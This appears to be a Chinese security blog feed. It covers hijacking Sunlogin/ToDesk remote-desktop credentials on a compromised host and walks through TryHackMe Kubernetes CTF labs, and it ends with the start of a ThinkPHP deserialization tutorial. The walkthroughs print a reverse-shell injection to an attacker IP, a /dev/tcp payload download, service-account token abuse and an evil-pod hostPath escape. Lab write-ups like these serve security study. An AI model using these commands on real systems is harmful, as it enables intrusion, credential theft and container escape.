</p><p>绿色版配置文件地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Oray\SunloginClientLite</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240125155946788.png" alt="image-20240125155946788"></p><p>关键的就是两个地方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encry_pwd=gFjC7qBWrv0=                  这个是验证码</span><br><span class="line"></span><br><span class="line">fastcode=k534515981                      这个是识别码</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>验证码的话使用上面给的解密工具就行了</p><p><a href="https://github.com/wafinfo/Sunflower_get_Password">https://github.com/wafinfo/Sunflower_get_Password</a></p><p><img src="../images/image-20240125160249720.png" alt="image-20240125160249720"></p><p>解密成功   然后进行登录</p><p><img src="../images/image-20240125160509206.png" alt="image-20240125160509206"></p><p>行了</p><h3 id="向日葵安装版"><a href="#向日葵安装版" class="headerlink" title="向日葵安装版"></a>向日葵安装版</h3><p>其实和上面差不多</p><p>如果目标主机没有   我们就选择上传绿色版</p><p>如果目标主机有 </p><ul><li>查看版本  配置文件是否有验证码和识别码</li><li>查看注册表</li><li>dump下来lsass文件  使用010来查看</li></ul><p>这就是针对目标机器上已经按照向日葵的方法</p><h2 id="toDesk"><a href="#toDesk" class="headerlink" title="toDesk"></a>toDesk</h2><p>todesk和向日葵一样  也是分为两个版本   就是绿色版和安装版  <strong>(均需要管理员权限运行  否者会报UAC)</strong></p><p>安装包还是在上面给的github里</p><h3 id="toDesk绿色版"><a href="#toDesk绿色版" class="headerlink" title="toDesk绿色版"></a>toDesk绿色版</h3><p>就是免装版  可以直接运行使用</p><p><img src="../images/image-20240126100729955.png" alt="image-20240126100729955"></p><p>他这个和向日葵的绿色版还不太一样  因为这个的话是可以直接最小化运行  不弹小窗出来   </p><p>我们去查看配置文件</p><p><code>C:\ProgramData\ToDesk_Lite\config.ini</code></p><p><img src="../images/image-20240126100846173.png" alt="image-20240126100846173"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">clientld  这个是连接id</span><br><span class="line"></span><br><span class="line">tempauthpassex  是连接密码 </span><br><span class="line"></span><br><span class="line">//这个的话我们启动后  直接将tempauthpassex复制到本机上  然后重启就行了</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240126101052986.png" alt="image-20240126101052986"></p><p>然后重启本机的todesk</p><p><img src="../images/image-20240126101136619.png" alt="image-20240126101136619"></p><p><img src="../images/image-20240126101152690.png" alt="image-20240126101152690"></p><p>这样的话就能获取到靶机上的  连接密码了</p><p><img src="../images/image-20240126101325314.png" alt="image-20240126101325314"></p><p>连接成功</p><h3 id="toDesk安装版"><a href="#toDesk安装版" class="headerlink" title="toDesk安装版"></a>toDesk安装版</h3><p>这个的话还是用的上面github地址里的文件</p><p>这里是用的静默安装toDesk</p><p><img src="../images/image-20240126101609322.png" alt="image-20240126101609322"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ToDesk_4.5.0.2.exe /S </span><br></pre></td></tr></table></figure><p>主要就是<code>/S</code>这个参数   不会显示安装过程  但是会显示安装成功的弹窗</p><p>我们还是先去修改其teamauthpassex密码  免得到时候又得重启一遍</p><p><img src="../images/image-20240126101825293.png" alt="image-20240126101825293"></p><p>靶机的临时密码复制到攻击机上</p><p><img src="../images/image-20240126101954177.png" alt="image-20240126101954177"></p><p><img src="../images/image-20240126102008072.png" alt="image-20240126102008072"></p><p>进行登录</p><p><img src="../images/image-20240126102132278.png" alt="image-20240126102132278"></p><p>成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这里主要就是介绍向日葵和toDesk   &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/wafinfo/Sunfl</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>TryHackMe-K8s</title>
    <link href="https://ke1nys.github.io/posts/88e96dbc.html"/>
    <id>https://ke1nys.github.io/posts/88e96dbc.html</id>
    <published>2024-01-23T06:38:31.000Z</published>
    <updated>2024-02-24T13:59:43.423Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kubernetes-for-Everyone"><a href="#Kubernetes-for-Everyone" class="headerlink" title="Kubernetes for Everyone"></a>Kubernetes for Everyone</h2><p>fscan 输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.10.58.32     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">10.10.58.32:111 open</span><br><span class="line">10.10.58.32:22 open</span><br><span class="line">10.10.58.32:3000 open</span><br><span class="line">10.10.58.32:5000 open</span><br><span class="line">10.10.58.32:6443 open</span><br><span class="line">[*] alive ports len is: 5</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://10.10.58.32:5000   code:200 len:887    title:Etch a Sketch</span><br><span class="line">[*] WebTitle: http://10.10.58.32:3000   code:302 len:29     title:None 跳转url: http://10.10.58.32:3000/login</span><br><span class="line">[*] WebTitle: https://10.10.58.32:6443  code:401 len:157    title:None</span><br><span class="line">[*] WebTitle: http://10.10.58.32:3000/login code:200 len:28034  title:Grafana</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240123145853723.png" alt="image-20240123145853723"></p><p>8.3.0存在任意文件读取的洞</p><p><img src="../images/image-20240123150003340.png" alt="image-20240123150003340"></p><p>这最后一行可以留个印象  等会会用到</p><p>5000端口</p><p><img src="../images/image-20240123150136733.png" alt="image-20240123150136733"></p><p>这个注释有东西 </p><p><img src="../images/image-20240123150258265.png" alt="image-20240123150258265"></p><p>访问该网站  得到了这个base32加密的东西 </p><p>解密得到  vagrant  (用户名)</p><p>上面的留意的那个是密码 然后ssh登录上去</p><p><img src="../images/image-20240123150543566.png" alt="image-20240123150543566"></p><p>k0s (k8s 轻量版), kine (etcd), 还有 docker   </p><p>etcd 可以理解为数据库  里面存一些配置文件啥的</p><p>k8s相当于docker  pods相当于docker里的容器</p><p>这里将数据库拖到本地看  因为这个玩意太卡了</p><p><img src="../images/image-20240123150822438.png" alt="image-20240123150822438"></p><p><img src="../images/image-20240123150907144.png" alt="image-20240123150907144"></p><p>开个服务传到本地就行了</p><p>根据提示去 secrets 里面找内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,hex(value) from kine where name like &#x27;%/registry/secrets/default/%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240123151124810.png" alt="image-20240123151124810"></p><p><img src="../images/image-20240123151142011.png" alt="image-20240123151142011"></p><p>然后本地解码一下 </p><p><img src="../images/image-20240123151418110.png" alt="image-20240123151418110"></p><p><img src="../images/image-20240123151405052.png" alt="image-20240123151405052"></p><p>一般在 kube-system 里面的 pod 都是 k8s 自己的服务, 并且会有一段随机后缀  </p><p>但是这里没</p><p><img src="../images/image-20240123151742053.png" alt="image-20240123151742053"></p><p>读取一下里面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(value) from kine where name like &#x27;%/registry/pods/kube-system/kube-api%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240123151841121.png" alt="image-20240123151841121"></p><p>这里其实也是对hex编码  然后我们还是挨个解码  并且访问</p><p>这里解码得出  <a href="https://hub.docker.com/r/csaju/jokes">https://hub.docker.com/r/csaju/jokes</a></p><p>我们将其docker pull 一下  拉到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --entrypoint /bin/bash csaju/jokes</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240123152250591.png" alt="image-20240123152250591"></p><p>查看git日志  然后挨个看看提交了什么</p><p>​    <img src="../images/image-20240123152318902.png" alt="image-20240123152318902"></p><p>flag到手</p><p>最后需要找 interview 什么的</p><p>发现 <code>internship-job-5drbm</code> 的 pod</p><p><img src="../images/image-20240123152556053.png" alt="image-20240123152556053"></p><p>去读取他的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(value) from kine where name like &#x27;%/registry/pods/internship/internship-job-5drbm%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240123152630373.png" alt="image-20240123152630373"></p><p>还是一样去解码</p><p>这里用一下xz师傅的图</p><p><img src="../images/image-20240123152655738.png" alt="image-20240123152655738"></p><h2 id="Insekube"><a href="#Insekube" class="headerlink" title="Insekube"></a>Insekube</h2><p><img src="../images/image-20240124092831717.png" alt="image-20240124092831717"></p><p>这傻逼靶机也出问题了  就是80端口扫不出来  直接80端口访问是可以的</p><p><img src="../images/image-20240124093043052.png" alt="image-20240124093043052"></p><p>一个ping命令的RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;bash -i &gt;&amp; /dev/tcp/10.14.53.199/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124093108489.png" alt="image-20240124093108489"></p><p><img src="../images/image-20240124093142096.png" alt="image-20240124093142096"></p><p>环境变量中有flag   然后也发现了  其使用K8s来管理这些容器  说明我们现在也在容器中  没在真正的服务器里</p><p>上传kubectl</p><p><img src="../images/image-20240124093839741.png" alt="image-20240124093839741"></p><p>查看开了哪些容器看不了  然后就看一下开了哪些权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./kubectl get pods</span><br><span class="line">./kubectl auth can-i --list</span><br></pre></td></tr></table></figure><p>发现这里这个secrets可以读</p><p><img src="../images/image-20240124093948202.png" alt="image-20240124093948202"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kube* get secrets</span><br></pre></td></tr></table></figure><p>接着读这个flag</p><p><img src="../images/image-20240124094039732.png" alt="image-20240124094039732"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./kube* get secrets secretflag -o json</span><br><span class="line"></span><br><span class="line">//将结果以json的格式进行输出  base64解码就能拿到flag了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124095344016.png" alt="image-20240124095344016"></p><p>查看环境变量发现存在个内网的GRAFANA  上个代理出来访问</p><p><img src="../images/image-20240124095702695.png" alt="image-20240124095702695"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/run/secrets/kubernetes.io/serviceaccount/token</span><br><span class="line"></span><br><span class="line">//这个是服务账户的令牌位置  (一般是最高权限了)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124100007465.png" alt="image-20240124100007465"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kube* get pods --token $token</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124100056144.png" alt="image-20240124100056144"></p><p>出现这个的话就是代表着有了最高权限了   我们进入到grafana这个容器内</p><p><img src="../images/image-20240124100248729.png" alt="image-20240124100248729"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kube* exec -it grafana-57454c95cb-f9js5 bash --token $token</span><br></pre></td></tr></table></figure><p>第三个flag到位了 </p><p>最后一步进行k8s逃逸  (其实和docker逃逸差不多)</p><p>先获取一下镜像名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kubectl get pods --all-namespaces -o=jsonpath=&#x27;&#123;range .items[*].spec.containers[*]&#125;&#123;.image&#125;&#123;&quot;\n&quot;&#125;&#123;end&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124100528405.png" alt="image-20240124100528405"></p><p>这里选的是这个syringe:latest</p><p>evil-pod.yaml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: evil-pod</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: syringe:latest</span><br><span class="line">    name: evil-container</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /host</span><br><span class="line">      name: evil-volume</span><br><span class="line">  volumes:</span><br><span class="line">  - name: evil-volume</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br></pre></td></tr></table></figure><p>上传到容器内</p><p><img src="../images/image-20240124100759671.png" alt="image-20240124100759671"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kube* apply -f evil* --token $token</span><br></pre></td></tr></table></figure><p>然后运行  新建一个容器  /host目录挂载着这个逃逸出来主机的根目录</p><p><img src="../images/image-20240124100912560.png" alt="image-20240124100912560"></p><p>然后进入这个主机内</p><p><img src="../images/image-20240124101005758.png" alt="image-20240124101005758"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kube* exec -it evil-pod bash --token $token</span><br></pre></td></tr></table></figure><p>这样就全部结束了</p><h2 id="Frank-and-Herby-try-again…"><a href="#Frank-and-Herby-try-again…" class="headerlink" title="Frank and Herby try again….."></a>Frank and Herby try again…..</h2><p>fscan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.10.101.251   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">10.10.101.251:22 open</span><br><span class="line">10.10.101.251:10255 open</span><br><span class="line">10.10.101.251:10250 open</span><br><span class="line">10.10.101.251:10257 open</span><br><span class="line">10.10.101.251:10259 open</span><br><span class="line">10.10.101.251:16443 open</span><br><span class="line">10.10.101.251:25000 open</span><br><span class="line">10.10.101.251:30679 open</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124103458009.png" alt="image-20240124103458009"></p><p>30679这个端口存在官方后门   直接找poc反弹shell</p><p><img src="../images/image-20240124103718385.png" alt="image-20240124103718385"></p><p><img src="../images/image-20240124103724913.png" alt="image-20240124103724913"></p><p><img src="../images/image-20240124103844826.png" alt="image-20240124103844826"></p><p>这里wget命令没法用  直接用自定义的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function DOWNLOAD() &#123;</span><br><span class="line">  url=$1</span><br><span class="line">  proto=&quot;http://&quot;</span><br><span class="line">  host=$&#123;url/$proto/&#125;</span><br><span class="line">  server=$&#123;host%%/*&#125;</span><br><span class="line">  path=$&#123;host#*/&#125;</span><br><span class="line">  DOC=/$&#123;path// /&#125;</span><br><span class="line">  HOST=$&#123;server/:*/&#125;</span><br><span class="line"></span><br><span class="line">  PORT=$&#123;server/*:/&#125;</span><br><span class="line">  [[ -n $&#123;PORT&#125; ]] || PORT=80</span><br><span class="line">  PORT=$(( PORT + 0 ))</span><br><span class="line"></span><br><span class="line">  exec 3&lt;&gt;/dev/tcp/$&#123;HOST&#125;/$&#123;PORT&#125;</span><br><span class="line">  echo -en &quot;GET $&#123;DOC&#125; HTTP/1.0\r\nHost: $&#123;HOST&#125;\r\n\r\n&quot; &gt;&amp;3</span><br><span class="line">  while IFS= read -r line ; do</span><br><span class="line">    [[ &quot;$&#123;line&#125;&quot; == $&#x27;\r&#x27; ]] &amp;&amp; break</span><br><span class="line">  done &lt;&amp;3</span><br><span class="line">  nul=&#x27;\0&#x27;</span><br><span class="line">  while IFS= read -d &#x27;&#x27; -r x || &#123; nul=&quot;&quot;; [ -n &quot;$x&quot; ]; &#125;; do</span><br><span class="line">    printf &quot;%s$&#123;nul&#125;&quot; &quot;$&#123;x&#125;&quot;</span><br><span class="line">  done &lt;&amp;3</span><br><span class="line">  exec 3&gt;&amp;-</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124104132499.png" alt="image-20240124104132499"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOAD http://10.14.53.199:8000/kubectl &gt; kubectl</span><br></pre></td></tr></table></figure><p>在等这个下载过程中  发现这个kubectl还存在未授权访问  <strong>(10255端口)</strong></p><p><img src="../images/image-20240124104431424.png" alt="image-20240124104431424"></p><p>这里直接使用了这个镜像  </p><p><strong>(这里download下的好慢  感觉不如写个后门然后连蚁剑上传上去来的快)</strong></p><p><img src="../images/image-20240124105351477.png" alt="image-20240124105351477"></p><p>这个直接就是最高权限了  </p><p>网卡死了。。。。。。。。。。。。。。。</p><p>接下来直接就是和上面一样  逃逸就行了</p><p>也是看镜像   然后逃逸 就行了 </p><h2 id="PalsForLife"><a href="#PalsForLife" class="headerlink" title="PalsForLife"></a>PalsForLife</h2><p>感觉其他的都差不多  就这个稍微有点意思  </p><p>rustscan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Open 10.10.19.196:22</span><br><span class="line">Open 10.10.19.196:6443</span><br><span class="line">Open 10.10.19.196:10250</span><br><span class="line">Open 10.10.19.196:30180</span><br><span class="line">Open 10.10.19.196:31112</span><br><span class="line">Open 10.10.19.196:31111</span><br></pre></td></tr></table></figure><p>挨个访问  挨个扫一下目录</p><p>31111  gitea</p><p>30180  <code>/team</code>     dirsearch</p><p><img src="../images/image-20240126141306393.png" alt="image-20240126141306393"></p><p>将这个base64编码解码后转化输出给PDF文件</p><p><img src="../images/image-20240126141411247.png" alt="image-20240126141411247"></p><p>使用john工具来爆破一下密码</p><p><img src="../images/image-20240126141615560.png" alt="image-20240126141615560"></p><p>爆破密码</p><p><img src="../images/image-20240126141625324.png" alt="image-20240126141625324"></p><p>查看</p><p><img src="../images/image-20240126141642101.png" alt="image-20240126141642101"></p><p>pdf内容</p><p><img src="../images/image-20240126141716751.png" alt="image-20240126141716751"></p><p>不知道有啥用   接着去看gitea这个web页面  31111端口</p><p><img src="../images/image-20240126141809240.png" alt="image-20240126141809240"></p><p>发现有个用户  尝试登录一下  使用pdf爆出来的字符串</p><p><img src="../images/image-20240126141847933.png" alt="image-20240126141847933"></p><p>登录成功后发现有个私有仓库 </p><p><img src="../images/image-20240126141938264.png" alt="image-20240126141938264"></p><p>仓库的webhooks里就有个flag</p><p>然后查到这个gitea版本存在有个hook—RCE</p><p><a href="https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce">https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce</a></p><p>跟着来打就行了   这里新打的时候有个坑  就是邮件账户需要配置正确  不然会失败</p><p><img src="../images/image-20240126142917114.png" alt="image-20240126142917114"></p><p><img src="../images/image-20240126143023021.png" alt="image-20240126143023021"></p><p>第二个flag</p><p><img src="../images/image-20240126143534010.png" alt="image-20240126143534010"></p><p>直接给了管理员权限  然后直接逃逸</p><p><img src="../images/image-20240126143929414.png" alt="image-20240126143929414"></p><p>查看一下镜像  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods --all-namespaces -o=jsonpath=&#x27;&#123;range .items[*].spec.containers[*]&#125;&#123;.image&#125;&#123;&quot;\n&quot;&#125;&#123;end&#125;&#x27;</span><br></pre></td></tr></table></figure><p>evil-pod.yaml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: evil-pod</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: nginx</span><br><span class="line">    name: evil-container</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /host</span><br><span class="line">      name: evil-volume</span><br><span class="line">  volumes:</span><br><span class="line">  - name: evil-volume</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br></pre></td></tr></table></figure><p>这里用的是这个nginx这个镜像 </p><p><img src="../images/image-20240126144205643.png" alt="image-20240126144205643"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./kube* apply -f evil-pod.yaml    //创建容器</span><br><span class="line"></span><br><span class="line">./kube* get pods //查看容器</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240126144304547.png" alt="image-20240126144304547"></p><p>进入到容器内</p><p><img src="../images/image-20240126144757619.png" alt="image-20240126144757619"></p><p>拿到最后一个flag了  突然发现还有一个  猜测是在secret中</p><p><img src="../images/image-20240126145058000.png" alt="image-20240126145058000"></p><p><img src="../images/image-20240126145110570.png" alt="image-20240126145110570"></p><p>查看这个flag文件</p><p><img src="../images/image-20240126145131842.png" alt="image-20240126145131842"></p><p><code>-n</code>指定命名空间    <code>-o</code> 指定输出格式</p><p>然后解码就行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Kubernetes-for-Everyone&quot;&gt;&lt;a href=&quot;#Kubernetes-for-Everyone&quot; class=&quot;headerlink&quot; title=&quot;Kubernetes for Everyone&quot;&gt;&lt;/a&gt;Kubernetes for Ev</summary>
      
    
    
    
    
    <category term="K8s" scheme="https://ke1nys.github.io/tags/K8s/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp反序列化</title>
    <link href="https://ke1nys.github.io/posts/1372eab4.html"/>
    <id>https://ke1nys.github.io/posts/1372eab4.html</id>
    <published>2024-01-17T06:56:28.000Z</published>
    <updated>2024-01-20T15:32:19.405Z</updated>
    
    <content type="html"><![CDATA[<p>实习的时候审代码发现自己对这种反序列化链的寻找能力不太行  于是去找个thinkphp的链子来学习学习</p><p>参考文章  <a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/</a></p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>这里先补充一下基础的知识</p><p>namespace等等反序列化链中常见的东西</p><h2 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h2><p><strong>namespace实际上就是命名空间，在php类与对象这一章节中用到了命名空间这个概念</strong></p><p>我们可以把namespace理解为一个单独的空间，子命名空间就是使用 <code>\</code>来进行划分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//例如</span><br><span class="line"></span><br><span class="line">namespace npm  这就是一个单独的空间</span><br><span class="line"></span><br><span class="line">namespace npm\a  a就是子空间了  就是在npm这个空间里面划分</span><br></pre></td></tr></table></figure><p>用代码来解释一下</p><p><img src="../images/image-20240117153950615.png" alt="image-20240117153950615"></p><p>这里的话npm就是个命名空间   A的话就是被划分的子空间了</p><p>这里如果存在多个命名空间的话  我们可以使用<code>use</code>来进行调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">npm</span>\<span class="title class_">A</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;aaaaaa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">npm</span>\<span class="title class_">B</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">npm</span>\<span class="title">A</span>\<span class="title">a</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;bbbbb&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117154339592.png" alt="image-20240117154339592"></p><p>还有一个是可以使用  <code>as</code> 就是做别名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">npm</span>\<span class="title class_">A</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span 